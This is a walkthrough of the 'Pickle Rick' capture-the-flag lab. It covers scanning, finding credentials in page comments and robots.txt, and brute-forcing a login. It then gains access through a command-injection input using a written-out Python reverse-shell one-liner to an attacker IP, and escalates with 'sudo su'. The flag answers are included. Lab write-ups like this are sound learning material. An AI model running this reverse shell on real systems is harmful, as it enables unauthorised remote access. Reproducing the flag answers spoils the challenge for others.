# Pickle Rick

TODO: Fix links

[Initial nmap scan](./logs/nmap_init.log)

[Gobuster scan](./logs/gobuster.log)

[Nikto scan](./logs/nikto.log)

On the main page:

```html
<!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->
```

robots.txt

```
Wubbalubbadubdub
```

[nmap all ports scan](./logs/nmap_all_ports.log)

[gobuster PHP root pages scan](./logs/gobuster-php-root.log)

Found a login.php, made a [brute force](./scripts/bruteforce.py) script to check for password, no password found

I dug around the site more and decided to take a look at the pictures. Using `strings`, found that the picture from the home page might have a secret in it based on it's beginning

![rick and morty running from their own demons](./img/rickandmorty.jpeg)

After searching around, I found `steghide`, which is used to hide data, though it looks to require a password.

After more searching, I found `stegseek` and decided to install and use it, nothing...

I changed my script around to be able to use `rockyou.txt`, after a while running that I realized that `Wubbalubbadubdub` was probably the password. And it was! Now we're onto something...

On the page after login page:

```html
<!-- Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0== -->
```

It was not worth it.

The starting page has a command input, which takes in commands directly. I reverse shell'd in.

```bash
export RHOST="10.6.89.232";export RPORT=4848;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

Then, there was an ingredient file in `www-data`

***What is the first ingredient Rick needs?*** [`mr. meeseek hair`]

There was a `clue.txt` which suggested looking around. After searching using `find / -name "*ngre*" 2>/dev/null`, it found something in a `rick` user's home folder. I opened the file in there 

***What is the second ingredient Rick needs?*** [`1 jerry tear`]

Decided to look for any SUID bit files. No dice

After a long ass time while searching around, beating my head against the desk, researching priv esc, my dumb ass finally tries `sudo su`. Guess what...

`cat /root/3rd.txt`

***What is the final ingredient Rick needs?*** [`fleeb juice`]
